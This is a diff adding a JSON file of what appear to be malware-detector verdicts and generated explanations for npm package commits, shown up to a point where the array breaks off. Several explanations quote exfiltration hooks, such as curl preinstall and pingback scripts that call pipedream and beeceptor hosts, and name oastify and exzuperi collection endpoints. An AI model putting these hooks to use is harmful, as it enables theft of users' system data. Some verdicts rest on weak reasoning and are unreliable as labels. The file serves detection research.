@@ -1,0 +1,1202 @@
+[
+  {
+    "hash": "4e16637bb6d3267e9966b52678ac31fa0c096e30",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file package.json**:\nCode: `https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script makes an HTTP request to a potentially suspicious external endpoint, which could be used for data exfiltration or as a callback for malicious activities.\n\n**Summary:** The static analysis revealed a critical issue with a potentially suspicious external endpoint being accessed, indicating possible malicious activity. Although the dynamic analysis did not yield any results, the presence of a critical issue in the static analysis is sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "d3c3f378a946e9d780d820841d58afb13e223ce8",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `HTTPS request to 'exzuperi.ftp.sh' on port 449`\nReason: Suspicious network access to a potentially malicious domain on a non-standard port, indicating potential data exfiltration.\n\n**At line N/A file index.js**:\nCode: `Collecting and exfiltrating system information`\nReason: The code is collecting sensitive system information such as home directory, hostname, and current directory, which is a common behavior of malware.\n\n**At line N/A file index.js**:\nCode: `Link to 'https://t.me/exzuperi'`\nReason: Printing a message with a link to a Telegram channel could indicate a backdoor or a way for the attacker to receive information, which is suspicious.\n\n**At line N/A file package.json**:\nCode: `'Error: exzuperi made me'`\nReason: The presence of a hidden message or signature in the 'test' script could be an indicator of malicious intent or authorship.\n\n**Summary:** The commit is classified as malware due to multiple critical and medium severity issues identified during static analysis, including suspicious network access, data exfiltration, and potential backdoor or contact information for the attacker. The dynamic analysis did not provide additional insights but the static analysis findings are sufficient to conclude the commit is malicious."
+  },
+  {
+    "hash": "aae3118a452965a886ed604e424f36bdae5ae619",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The package 'zxcvbnmmmmmmkjhgfdssss' is likely a typo or an unused package, and its presence is not conclusive evidence of malware. The 'docs:check-links' script accessing 'http://127.0.0.1:8089' is likely a local development server and not indicative of malware.\n\n**Summary:** The static analysis raised concerns about a suspicious package and a potential information leak. However, the dynamic analysis did not reveal any malicious activity. Given the context, the commit is likely benign, possibly containing a typo or unused package, and the network access is related to a local development server."
+  },
+  {
+    "hash": "98b1e819573c66ac133f1019714b0a7a71660643",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: Suspicious external domain access, potential data exfiltration\n\n**At line N/A file index.js**:\nCode: `POST request to n1pygus02nu7ucngy5gl8qd0crii67.oastify.com with sensitive system information`\nReason: Clear case of data exfiltration, sending sensitive system information to an external server\n\n**Summary:** The commit contains code that makes suspicious network requests and exfiltrates sensitive system information, indicating malicious intent."
+  },
+  {
+    "hash": "a631ed877af9464c8ca0588772fdf55e5ce1d22d",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `nslookup operation to ex.sysdum.net`\nReason: The 'test' and 'preinstall' scripts perform potentially malicious nslookup operations, exfiltrating sensitive information to an external domain.\n\n**At line None file package.json**:\nCode: `HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script makes an HTTP request to a potentially malicious URL, indicating possible malware communication.\n\n**Summary:** The commit contains scripts that perform suspicious network activities, including exfiltrating sensitive information and making requests to potentially malicious URLs, indicating malware behavior."
+  },
+  {
+    "hash": "64e45fcbb177d2d1fec73762e4657cd524700a12",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "4555d68f11e4d80bda4b66e24c9563a0cffa9c0e",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "1f970d963747dfe0002209263636f8af6684d37f",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file lib/index.js**:\nCode: `cors_parser()`\nReason: The function call to 'cors_parser()' is potentially vulnerable to code injection if the 'cors-parser' package is maliciously modified or compromised.\n\n**At line None file package.json**:\nCode: `'cors-parser' dependency`\nReason: The 'cors-parser' package is not a standard or well-known package, potentially indicating suspicious network access or a malicious dependency.\n\n**Summary:** The commit contains a potentially vulnerable function call to 'cors_parser()' and a suspicious dependency 'cors-parser' in 'package.json', indicating a possible malware or backdoor."
+  },
+  {
+    "hash": "2829d6a2d0201ebc9eb79a135a19c86dc9aedb4d",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line N/A file repeat-str.cjs**:\nCode: `N/A`\nReason: Code is written in a compact style, but this is not conclusive evidence of malware. Reformatting can improve readability.\n\n**At line N/A file repeat-str.js**:\nCode: `N/A`\nReason: Similar to repeat-str.cjs, compact code is not necessarily malicious.\n\n**At line N/A file N/A**:\nCode: `N/A`\nReason: Suspicious URLs detected in commit message, but dynamic analysis did not reveal any malicious activity.\n\n**Summary:** The static analysis raised some concerns, but the dynamic analysis did not detect any malicious behavior. The issues identified can be addressed through code review and reformatting."
+  },
+  {
+    "hash": "d4c2e06ac41bd69f7e081d768a9f466bedcbe32c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: The code is sending sensitive system information to an external server via HTTPS POST request, indicating malicious data exfiltration.\n\n**At line None file index.js**:\nReason: The code is collecting and sending sensitive system information such as homedir, hostname, username, and DNS servers, which is a potential data leak.\n\n**Summary:** The static analysis revealed critical and high-severity issues related to sending sensitive system information to an external server, indicating malicious activity. Although the dynamic analysis did not provide additional insights, the static analysis findings are sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "9f99f902ec17f66b626885c8127814931a1400d0",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "657eccd74adad688b628734f3ac00b950ba71411",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script is making an HTTP request to an external server, which could be used for data exfiltration or other malicious purposes.\n\n**At line None file commit message**:\nCode: `https://t.me/+u9dz2n6sGos1ZmEy`\nReason: The commit message contains a link to a Telegram channel, which could be used for communication with unknown parties, potentially for malicious purposes.\n\n**Summary:** The commit contains suspicious network access patterns and potentially malicious communication channels, indicating a possible malware presence."
+  },
+  {
+    "hash": "2e9e1ef8b99c75e3a9151d442b8a0d025572a00a",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line Not Available file index.js**:\nCode: `Not Available`\nReason: The code establishes a reverse shell connection to a remote server and executes commands received from the server, which is a serious security risk as it allows remote code execution.\n\n**At line Not Available file index.js**:\nCode: `Not Available`\nReason: The code connects to a remote server using a hardcoded URL and port, potentially exfiltrating data or establishing a backdoor.\n\n**Summary:** The commit contains code that establishes a reverse shell and connects to a hardcoded remote server, indicating malicious intent and a significant security risk."
+  },
+  {
+    "hash": "6abe477a53ef62b5eb479dc6925393ac526ddcec",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: Suspicious external server request, potential data exfiltration\n\n**At line None file index.js**:\nCode: `Sending system information (homedir, hostname, username, DNS servers) to 8hqsazb9n32zxshfc7cakdpiz950tqhf.oastify.com`\nReason: Serious data leak, sensitive information being sent to an external server\n\n**At line None file index.js**:\nCode: `POST request to 8hqsazb9n32zxshfc7cakdpiz950tqhf.oastify.com`\nReason: Suspicious domain, potential for data exfiltration or malicious activity\n\n**At line None file index.js**:\nCode: `Use of 'os' and 'os.userInfo().username'`\nReason: Potential exposure of sensitive information, contributing to the larger issue of sending sensitive data externally\n\n**Summary:** The commit is classified as malware due to multiple critical and high-severity issues identified in the static analysis, including data leaks and suspicious network access to external servers. The dynamic analysis did not provide additional insights but the static findings are sufficient to determine the commit is malicious."
+  },
+  {
+    "hash": "3b4cebf4f3d6eeac49474e6413c03c0db282e0a1",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file data.js**:\nReason: The data.js file is flagged for containing a large amount of data, but no obvious security issues related to network access were found. The commit message and code changes suggest it was added in this commit, and upon review, it does not contain any sensitive information.\n\n**At line None file demo.js**:\nReason: The demo.js file uses the require function to import index.js and contains console.log statements. While these could potentially be used to leak information, there is no concrete evidence of malicious activity.\n\n**Summary:** The static analysis raised some concerns regarding data.js and demo.js, but upon closer inspection, the issues were not critical or indicative of malware. The dynamic analysis did not yield any results indicating malicious behavior. Therefore, the commit is considered benign."
+  },
+  {
+    "hash": "40204310bd97936af6ef7463778bb91d3f04c1a7",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "df31d8f9fcbe9a518bd552e44f357632ea1281c4",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "063e90779ef2b46d08c54ac9a73ae4f4e686d726",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file installer.js**:\nCode: `HTTPS request to 'cig6l3l34eboiti6qhjg6bi17eq4dpqwn.oast.me'`\nReason: The domain appears to be suspicious and is being used to exfiltrate sensitive information such as username, hostname, and current working directory.\n\n**At line N/A file installer.js**:\nCode: `child_process.execSync`\nReason: The use of execSync with potentially untrusted input can lead to command execution vulnerabilities.\n\n**At line N/A file package.json**:\nCode: `'pingback' script making a curl request to 'https://eo536ohsnextro9.m.pipedream.net'`\nReason: The 'pingback' script is making a request to a suspicious domain, indicating potential malware behavior.\n\n**Summary:** The commit contains multiple indicators of malware behavior, including suspicious network requests, potential command execution vulnerabilities, and data exfiltration. The static analysis revealed critical and high-severity issues that are characteristic of malicious code."
+  },
+  {
+    "hash": "8a258cc6412ec633c52dcdfca242290d980322d9",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script is making an HTTP request to an external server, which could be used for data exfiltration or other malicious purposes.\n\n**Summary:** The commit is flagged as malware due to the suspicious 'pingback' script in package.json, which makes an HTTP request to an external server. Although the dynamic analysis did not reveal any issues, the static analysis raised a medium-severity concern that warrants caution."
+  },
+  {
+    "hash": "b2f02b1fb79178d388fd6c54284ac18c9aeb4980",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file index.js**:\nCode: `HTTPS request to 'exzuperi.ftp.sh'`\nReason: The code is making an HTTPS request to a suspicious domain with sensitive system information, indicating potential malicious activity.\n\n**At line unknown file index.js**:\nCode: `Leaking system information (homedir, hostname)`\nReason: The code is leaking sensitive system information, which could be used for malicious purposes.\n\n**At line unknown file index.js**:\nCode: `Telegram link to 'https://t.me/exzuperi'`\nReason: The presence of a Telegram link might indicate suspicious communication or command and control channel.\n\n**Summary:** The commit is classified as malware due to the presence of critical issues such as suspicious network access and data leaks, indicating potential malicious activity."
+  },
+  {
+    "hash": "e88a54becd722227b99a52ff45dd25c577904e82",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file jquery.min.js**:\nCode: `AJAX request to 'https://api-web-vrip.hanznesia.my.id/?cat='`\nReason: The AJAX request to an unknown domain with serialized form data is suspicious and could be used for data exfiltration or other malicious activities.\n\n**At line unknown file jquery.min.js**:\nCode: `Use of String.fromCharCode and hexadecimal encoding`\nReason: The presence of obfuscated code is a red flag, as it can be used to hide malicious functionality.\n\n**Summary:** The commit contains suspicious network activity and obfuscated code, indicating potential malware. Although the dynamic analysis did not yield any results, the static analysis findings are concerning enough to classify this commit as malware."
+  },
+  {
+    "hash": "1bff3b1d589da89f06811f9e8bec7dfcdf45d9e5",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line Not Available file index.js**:\nCode: `Sending sensitive system information via HTTPS POST request`\nReason: This is suspicious because it involves leaking sensitive system information to an external server without clear justification or user consent.\n\n**At line Not Available file index.js**:\nCode: `Leaking homedir, hostname, username, and DNS servers`\nReason: This is a critical data leak that could be used for malicious purposes such as targeted attacks or reconnaissance.\n\n**At line Not Available file package.json**:\nCode: `Suspicious 'pingback' and 'preinstall' scripts`\nReason: These scripts could be used to execute malicious code during the package installation process, indicating a potential backdoor or malware persistence mechanism.\n\n**Summary:** The commit is flagged as malware due to critical issues identified in the static analysis, including the leakage of sensitive system information and suspicious network requests. The dynamic analysis did not provide additional insights but the static findings are sufficient to classify the commit as malicious."
+  },
+  {
+    "hash": "1ea0894cdb70e1927dcff195db673c8e6a67450b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `child_process.spawn`\nReason: The code uses child_process.spawn to execute a Python script with user-controlled input, which can lead to command injection attacks.\n\n**At line None file test.js**:\nCode: `child_process.spawn`\nReason: The code uses child_process.spawn to execute a Python script with user-controlled input, which can lead to command injection attacks.\n\n**At line None file sx1262.py**:\nCode: `\\xc0\\xc1\\xc2\\xc3`\nReason: The code contains obfuscated commands in the form of hex-encoded strings, which could be used to hide malicious activity.\n\n**At line None file rx.py**:\nCode: `reading data from serial port`\nReason: The code reads data from a serial port and prints it to the console, potentially exfiltrating sensitive data.\n\n**Summary:** The commit contains multiple critical and high-severity issues, including command injection vulnerabilities and obfuscated code, indicating a high likelihood of malicious intent."
+  },
+  {
+    "hash": "40223784811d65875ce2b80b7aa73024f393fbf6",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "e85b5f5fc7f6dceff87b14176f9622e169c0d74e",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `'preinstall': 'curl https://bes23.free.beeceptor.com'`\nReason: The 'preinstall' script makes an HTTP request to a potentially malicious URL before installation, which could be used for data exfiltration or other malicious activities.\n\n**At line None file package.json**:\nCode: `'pingback': 'curl https://eo536ohsnextro9.m.pipedream.net'`\nReason: The 'pingback' script makes an HTTP request to a potentially malicious URL, which could be used for data exfiltration or other malicious activities.\n\n**Summary:** The commit contains scripts that make HTTP requests to potentially malicious URLs, indicating possible data exfiltration or other malicious activities, hence classified as malware."
+  },
+  {
+    "hash": "ef03551ff4eed01552393d17b6f47d252e53acb1",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file lib/service.js**:\nCode: `https://kfc.yuki.sh/api/index`\nReason: The code makes an HTTP request to a non-standard API endpoint, which is suspicious and could be a sign of malicious activity or data exfiltration.\n\n**At line None file lib/service.js**:\nCode: `bot.sendGroupMsg`\nReason: The functionality to send messages to groups could be misused if not properly controlled, indicating potential for malicious behavior.\n\n**At line None file None**:\nCode: `node /usr/local/bin/npm install --unsafe-perm connection=172.17.0.2:38048->20.205.243.165:443`\nReason: The dynamic analysis shows a disallowed outbound connection during 'npm install', suggesting potential malicious activity or unauthorized communication.\n\n**Summary:** The commit is classified as malware due to suspicious network activities, including a non-standard API endpoint access and a disallowed outbound connection during the execution of 'npm install'. These behaviors are indicative of potential malicious activity."
+  },
+  {
+    "hash": "ecda94ad9e4ed8faf5107a4e4fe9077eb49354d9",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file jquery.min.js**:\nCode: `AJAX request to 'https://panel.api-bo.my.id/?key='`\nReason: Sends serialized form data to an external server, potentially for data exfiltration or other malicious activities.\n\n**At line None file package.json**:\nCode: `New dependencies 'livinjs' and 'xytta'`\nReason: These packages seem to be potentially malicious.\n\n**At line None file .bash_history**:\nCode: `Accessed 'https://maulanarizky-store-disini.rizkyxd.me/ip.php'`\nReason: This URL is considered suspicious or malicious.\n\n**At line None file None**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: Made an outbound connection to 20.205.243.165:443, which is considered a disallowed outbound connection destination.\n\n**Summary:** The commit contains multiple indicators of malicious activity, including suspicious network access, potentially malicious packages, and disallowed outbound connections. These findings collectively suggest that the commit is likely to be malware."
+  },
+  {
+    "hash": "40ce970cb4606791b4d4d7a7c3683ade254ada0c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line Unknown file Unknown (code not provided)**:\nCode: `Potential use of 'exec'`\nReason: The static analysis indicates a potential command injection vulnerability due to the use of 'exec' with potentially untrusted input, which is a common trait of malware.\n\n**At line Unknown file container.name**:\nCode: `some-container-cb8ee5ad-00dd-4423-be58-47ba6758c1f0.tgz`\nReason: The dynamic analysis shows a container named with a '.tgz' extension, which is unusual and could indicate a malicious or suspicious container.\n\n**At line Unknown file proc.cmdline**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command 'npm install --unsafe-perm' is suspicious because '--unsafe-perm' can allow scripts to run with elevated privileges, a trait often exploited by malware.\n\n**At line Unknown file fd.name**:\nCode: `172.17.0.2:38056->20.205.243.165:443`\nReason: The dynamic analysis reveals an outbound connection to an external IP address on port 443, which could be indicative of malware communicating with its command and control server.\n\n**Summary:** The commit is classified as malware due to multiple indicators of potentially malicious behavior, including a potential command injection vulnerability, suspicious container naming, use of '--unsafe-perm' with npm install, and an unexpected outbound network connection."
+  },
+  {
+    "hash": "43d0641637702b43249dbb28d66df079c5d5e1f2",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file not available**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command 'npm install --unsafe-perm' is executed, which can be a sign of malicious activity as it allows for the installation of packages from untrusted sources with elevated permissions.\n\n**At line not available file not available**:\nCode: `connection=172.17.0.2:38060->20.205.243.165:443`\nReason: An outbound connection is made to a potentially malicious IP address (20.205.243.165), which is flagged by the rule 'Unexpected outbound connection destination'.\n\n**Summary:** The dynamic analysis reveals a suspicious outbound connection and the execution of 'npm install --unsafe-perm', indicating potential malicious activity. The static analysis did not raise any issues, but the dynamic analysis findings suggest that the commit is likely to be malware."
+  },
+  {
+    "hash": "ba3478dff1ac8995199d57c262cbfc683f57ffac",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file not available**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command is running npm install with --unsafe-perm, which can be a security risk as it allows the package installation to run arbitrary scripts with root privileges. The connection to 20.205.243.165:443 is flagged as a disallowed outbound connection destination.\n\n**At line not available file not available**:\nCode: `connection=172.17.0.2:38064->20.205.243.165:443`\nReason: The container is making an outbound connection to a potentially malicious IP address (20.205.243.165:443), which is flagged by the 'Unexpected outbound connection destination' rule.\n\n**At line not available file not available**:\nCode: `image=maldep`\nReason: The container image is named 'maldep', which suggests it could be related to malware deployment.\n\n**Summary:** The dynamic analysis reveals a potentially malicious container making an unexpected outbound connection to a potentially malicious IP address. The use of 'npm install --unsafe-perm' with a container image named 'maldep' further indicates a potential malware behavior."
+  },
+  {
+    "hash": "c35a42570ff7587302f577b8b5ee57607b31a248",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file not available**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command 'npm install --unsafe-perm' is executed, which can be a security risk as it allows the installation of packages with elevated privileges. The container image 'maldep' is also used, which could be malicious.\n\n**At line not available file not available**:\nCode: `connection=172.17.0.2:38068->20.205.243.165:443`\nReason: An outbound connection is made to a potentially malicious destination (20.205.243.165:443), which is flagged by the rule 'Unexpected outbound connection destination'.\n\n**Summary:** The dynamic analysis reveals a potentially malicious activity where a container makes an unexpected outbound connection to a destination that is flagged as disallowed. The use of '--unsafe-perm' with 'npm install' and the image 'maldep' further raises security concerns, indicating that this commit is likely to be malware."
+  },
+  {
+    "hash": "4a96c3124d4ea4beeed354c5874405846574c50f",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file commit 4a96c3124d4ea4beeed354c5874405846574c50f**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The use of '--unsafe-perm' with 'npm install' can potentially allow arbitrary code execution, and the connection to an external IP (20.205.243.165:443) is flagged as a disallowed outbound connection destination.\n\n**Summary:** The dynamic analysis revealed a suspicious outbound connection to an external IP address while running 'npm install' with '--unsafe-perm', indicating potential malware behavior."
+  },
+  {
+    "hash": "acece12f68bd1aae87b3f0b61cec390ad050dc5f",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file Dynamic Analysis Output**:\nCode: `node /usr/local/bin/npm install --unsafe-perm connection=172.17.0.2:38076->20.205.243.165:443`\nReason: The command 'npm install --unsafe-perm' is being executed and it is making an outbound connection to a potentially malicious destination (20.205.243.165:443). The use of '--unsafe-perm' can allow the execution of scripts with elevated privileges, which is a security risk.\n\n**At line None file Dynamic Analysis Output**:\nCode: `image=maldep`\nReason: The container image is named 'maldep', which suggests it might be related to malware or malicious activity.\n\n**Summary:** The dynamic analysis reveals a potentially malicious outbound connection and the use of a container image with a suspicious name. Although the static analysis did not find any issues, the dynamic analysis findings indicate that the commit is likely to be malware."
+  },
+  {
+    "hash": "7c6c00d8d7b0092f6c384d036c96452685b8da78",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file commit 7c6c00d8d7b0092f6c384d036c96452685b8da78**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command 'npm install --unsafe-perm' is executed, which can run arbitrary scripts with elevated privileges. The connection to an external IP (20.205.243.165:443) is also suspicious.\n\n**At line None file Dynamic Analysis**:\nCode: `172.17.0.2:38080->20.205.243.165:443`\nReason: The outbound connection to 20.205.243.165:443 is flagged as 'Disallowed outbound connection destination', indicating a potential malicious activity.\n\n**Summary:** The dynamic analysis reveals a suspicious outbound connection and the execution of 'npm install --unsafe-perm', which together indicate potential malware activity. The static analysis did not raise any issues, but the dynamic analysis findings outweigh the static analysis results."
+  },
+  {
+    "hash": "0ef45ef6f973cfe3aab27ab44c2076cf32d0cde3",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file main.js**:\nCode: `https://api.foursquare.com/v2/`\nReason: The code is making HTTP requests to a potentially malicious API endpoint which could be used for data exfiltration or other malicious activities.\n\n**At line None file main.js**:\nCode: `oauth_token`\nReason: The code is storing sensitive information like 'oauth_token' in the config object, which is a bad practice and could lead to data leaks.\n\n**At line None file None**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The dynamic analysis shows that the container is making an unexpected outbound connection to 20.205.243.165:443, which is a suspicious behavior.\n\n**Summary:** The commit is classified as malware due to the presence of suspicious network access, potential data leaks, and unexpected outbound connections. The static analysis revealed critical and high-severity issues, while the dynamic analysis showed disallowed outbound connections, indicating a potential malicious activity."
+  },
+  {
+    "hash": "99e7cd10e3730d1e1e4a4fe4b1962dbdb51eeac9",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file commit 99e7cd10e3730d1e1e4a4fe4b1962dbdb51eeac9**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command 'node /usr/local/bin/npm install --unsafe-perm' is executed, which is a suspicious command as it installs npm packages with elevated privileges. The connection to 20.205.243.165:443 is also flagged as a disallowed outbound connection destination.\n\n**At line N/A file container.name**:\nCode: `some-container-f8f05bac-9ed4-4af1-b238-a4105a7b8cf8.tgz`\nReason: The container name suggests it was generated or named in a way that could be related to a specific task or identifier, potentially indicating a malicious or automated process.\n\n**At line N/A file container.image.repository**:\nCode: `maldep`\nReason: The container image repository is named 'maldep', which could be an indication of malicious intent or a potentially unwanted application.\n\n**Summary:** The dynamic analysis revealed a suspicious command execution and an unexpected outbound connection to a potentially malicious destination. The container image repository name 'maldep' further supports the verdict that this commit is related to malware."
+  },
+  {
+    "hash": "8dcad674120ab9830d38645679fd1aa7bf12768c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file not available**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command is running npm install with --unsafe-perm, which can be a security risk as it allows the installation of packages with elevated privileges. The connection to an external IP (20.205.243.165:443) is also flagged as 'Disallowed outbound connection destination', indicating a potential malicious activity.\n\n**Summary:** The dynamic analysis revealed a suspicious outbound connection and the use of --unsafe-perm with npm install, indicating potential malicious activity. The static analysis did not raise any issues, but the dynamic analysis findings suggest that the commit is likely to be malware."
+  },
+  {
+    "hash": "db9bb1e41079ee969fc2196ea62a541892797e24",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall script making HTTP request to https://bes23.free.beeceptor.com`\nReason: Suspicious external URL request, potential data exfiltration or malicious activity\n\n**At line None file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: Suspicious external URL request, potential data exfiltration or malicious activity\n\n**At line None file index.js**:\nCode: `POST request to 356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com with sensitive system information`\nReason: Suspicious external URL request with sensitive data, potential data exfiltration or malicious activity\n\n**At line None file index.js**:\nCode: `Collecting and sending sensitive system information (homedir, hostname, username, dns servers)`\nReason: Potential data leak, sensitive information being sent to an external URL\n\n**Summary:** Multiple critical and high-severity issues detected, including suspicious network requests and data leaks, indicating malicious behavior"
+  },
+  {
+    "hash": "41bb9d176216d2f0f14392b082875bf63ec241f8",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Sends HTTP requests to potentially malicious URLs with sensitive information as query parameters.\n\n**At line None file package.json**:\nReason: The 'preinstall' script runs 'node index.js', which contains suspicious code.\n\n**At line None file index.js**:\nReason: Uses obfuscated variable names and string encoding, making it difficult to understand its intent.\n\n**At line None file index.js**:\nReason: Sends sensitive information such as hostname, username, and current working directory to external URLs.\n\n**At line None file None**:\nReason: Dynamic analysis detected an unexpected outbound connection to 20.205.243.165:443, indicating potential malicious activity.\n\n**Summary:** The commit is classified as malware due to multiple critical and high-severity issues identified in both static and dynamic analyses, including suspicious network access, data leaks, and obfuscation techniques."
+  },
+  {
+    "hash": "54d80ea5d1b43927a17c6e983d39e67899f661f2",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file install.js**:\nCode: `Sending a POST request to 'oastify.com' with the hostname encoded as payload`\nReason: This is a potential data exfiltration attempt, as it sends sensitive information (hostname) to an external server without a clear legitimate reason.\n\n**At line None file install.js**:\nCode: `Using 'process.argv[2]' directly without validation`\nReason: This could lead to potential security issues if the input is not sanitized, making it a risky practice.\n\n**At line None file install.js**:\nCode: `'rejectUnauthorized' option set to 'false'`\nReason: This makes the HTTPS request vulnerable to man-in-the-middle attacks, compromising the security of the communication.\n\n**At line None file None**:\nCode: `Unexpected outbound connection destination (20.205.243.165:443)`\nReason: The dynamic analysis detected an unexpected outbound connection, which aligns with the static analysis findings of suspicious network access.\n\n**Summary:** The commit is classified as malware due to multiple indicators of malicious behavior, including suspicious network access, potential data exfiltration, and insecure practices. The static and dynamic analyses collectively provide strong evidence that this commit is not benign."
+  },
+  {
+    "hash": "587b6c37ecb86aae48d5ed36680e6f7c5ff82ef2",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file browser.js**:\nReason: Sending a POST request to a suspicious domain with sensitive system information.\n\n**At line None file browser.js**:\nReason: Leaking sensitive system information such as home directory, hostname, username, and DNS servers.\n\n**At line None file package.json**:\nReason: The 'pingback' script is making a curl request to a suspicious domain.\n\n**At line None file package.json**:\nReason: The 'preinstall' script is running the 'browser.js' file which contains suspicious code.\n\n**At line None file None**:\nReason: Dynamic analysis detected an unexpected outbound connection to a potentially malicious destination.\n\n**Summary:** The commit is classified as malware due to multiple critical and high-severity issues identified in both static and dynamic analysis, including suspicious network access, data leaks, and unexpected outbound connections."
+  },
+  {
+    "hash": "ecbe5cc14e5b6db7f9119f19f7770acfb56ffbe7",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall script making HTTP request`\nReason: The preinstall script makes an HTTP request to an external server with a header containing the current user's username, potentially leaking sensitive information.\n\n**At line None file package.json**:\nCode: `pingback script`\nReason: The pingback script makes an HTTP request to a suspicious domain, potentially indicating data exfiltration or a backdoor.\n\n**At line None file package.json**:\nCode: `postinstall script`\nReason: The postinstall script contains a suspicious message, potentially indicating a backdoor or malicious activity.\n\n**At line None file None**:\nCode: `outbound connection to 20.205.243.165:443`\nReason: Dynamic analysis detected an unexpected outbound connection to 20.205.243.165:443 during npm install, indicating potential data exfiltration or communication with a command and control server.\n\n**Summary:** The commit is classified as malware due to multiple indicators of potentially malicious behavior, including suspicious network requests, potential data exfiltration, and backdoor indicators identified in both static and dynamic analysis."
+  },
+  {
+    "hash": "3a840947e6b1a1fffdd63b56a554c0e73a621918",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file build.js**:\nReason: The code is exfiltrating sensitive system information via DNS lookup and HTTP requests, and is using command execution with potentially user-controlled input.\n\n**At line None file package.json**:\nReason: The pingback script makes a curl request to an external server, which could be used for data exfiltration or other malicious purposes.\n\n**Summary:** The commit contains code that exfiltrates sensitive information, makes suspicious HTTP requests, and executes system commands with potentially user-controlled input, indicating malicious behavior."
+  },
+  {
